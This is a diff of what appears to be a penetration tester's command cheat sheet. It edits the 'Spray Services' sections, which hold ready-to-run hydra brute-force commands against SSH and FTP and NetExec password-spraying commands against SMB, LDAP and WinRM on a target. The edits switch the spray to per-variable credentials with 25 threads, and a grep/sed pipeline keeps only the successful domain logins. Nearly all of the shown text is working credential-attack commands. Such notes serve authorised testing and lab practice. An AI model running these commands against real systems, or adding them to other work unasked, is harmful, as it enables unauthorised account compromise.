@@ -152,13 +152,15 @@ cat passwords | sort -u | tee passwords
 ## Spray Services
 (hydra -I ssh://$TARGET -L usernames -P passwords -e n -t15 2>/dev/null &)
 (hydra -I ftp://$TARGET -L usernames -P passwords -e n -t15 2>/dev/null &)
+
+SPRAYU=$USERNAME;SPRAYP=$PASSWORD; \
 (
-(nxc smb "$TARGET" -u usernames -p passwords --continue-on-success &)
-(nxc ldap "$TARGET" -u usernames -p passwords --continue-on-success &)
-(nxc winrm "$TARGET" -u usernames -p passwords --continue-on-success &)
-(nxc smb "$TARGET" -u usernames -p usernames --continue-on-success --no-bruteforce &)
-(nxc ldap "$TARGET" -u usernames -p usernames --continue-on-success --no-bruteforce &)
-(nxc winrm "$TARGET" -u usernames -p usernames --continue-on-success --no-bruteforce &)
+(nxc smb "$TARGET" -u "$SPRAYU" -p "$SPRAYP" --continue-on-success -t 25 &)
+(nxc ldap "$TARGET" -u "$SPRAYU" -p "$SPRAYP" --continue-on-success -t 25 &)
+(nxc winrm "$TARGET" -u "$SPRAYU" -p "$SPRAYP" --continue-on-success -t 25 &)
+(nxc smb "$TARGET" -u "$SPRAYU" -p "$SPRAYP" --continue-on-success --no-bruteforce -t 25 &)
+(nxc ldap "$TARGET" -u "$SPRAYU" -p "$SPRAYP" --continue-on-success --no-bruteforce -t 25 &)
+(nxc winrm "$TARGET" -u "$SPRAYU" -p "$SPRAYP" --continue-on-success --no-bruteforce -t 25 &)
 ) | grep -a --line-buffered -oP '\d{1,3}(?:\.\d{1,3}){3}\s+\d+\s+\S+\s.*$DOM\\\S.*' | sed -E '/\[\+\]|CHANGE/ { s/($DOM\\)([^:]+:[^ ].*)/\1\x1b[1;33m\2\x1b[0m/; /\x1b\[1;33m/!d }' | grep --color=always -P '\x1b\[1;33m.*\x1b\[0m'
 
 ## Web
@@ -205,13 +207,14 @@ tar -xzvf backup.tar.gz -C .
 unzip backup.zip -d .
 
 ## Spray Services
+SPRAYU=$USERNAME;SPRAYP=$PASSWORD; \
 (
-(nxc smb "$TARGET" -u usernames -p passwords --continue-on-success &)
-(nxc ldap "$TARGET" -u usernames -p passwords --continue-on-success &)
-(nxc winrm "$TARGET" -u usernames -p passwords --continue-on-success &)
-(nxc smb "$TARGET" -u usernames -p usernames --continue-on-success --no-bruteforce &)
-(nxc ldap "$TARGET" -u usernames -p usernames --continue-on-success --no-bruteforce &)
-(nxc winrm "$TARGET" -u usernames -p usernames --continue-on-success --no-bruteforce &)
+(nxc smb "$TARGET" -u "$SPRAYU" -p "$SPRAYP" --continue-on-success -t 25 &)
+(nxc ldap "$TARGET" -u "$SPRAYU" -p "$SPRAYP" --continue-on-success -t 25 &)
+(nxc winrm "$TARGET" -u "$SPRAYU" -p "$SPRAYP" --continue-on-success -t 25 &)
+(nxc smb "$TARGET" -u "$SPRAYU" -p "$SPRAYP" --continue-on-success --no-bruteforce -t 25 &)
+(nxc ldap "$TARGET" -u "$SPRAYU" -p "$SPRAYP" --continue-on-success --no-bruteforce -t 25 &)
+(nxc winrm "$TARGET" -u "$SPRAYU" -p "$SPRAYP" --continue-on-success --no-bruteforce -t 25 &)
 ) | grep -a --line-buffered -oP '\d{1,3}(?:\.\d{1,3}){3}\s+\d+\s+\S+\s.*$DOM\\\S.*' | sed -E '/\[\+\]|CHANGE/ { s/($DOM\\)([^:]+:[^ ].*)/\1\x1b[1;33m\2\x1b[0m/; /\x1b\[1;33m/!d }' | grep --color=always -P '\x1b\[1;33m.*\x1b\[0m'
 
 ## Valid Creds
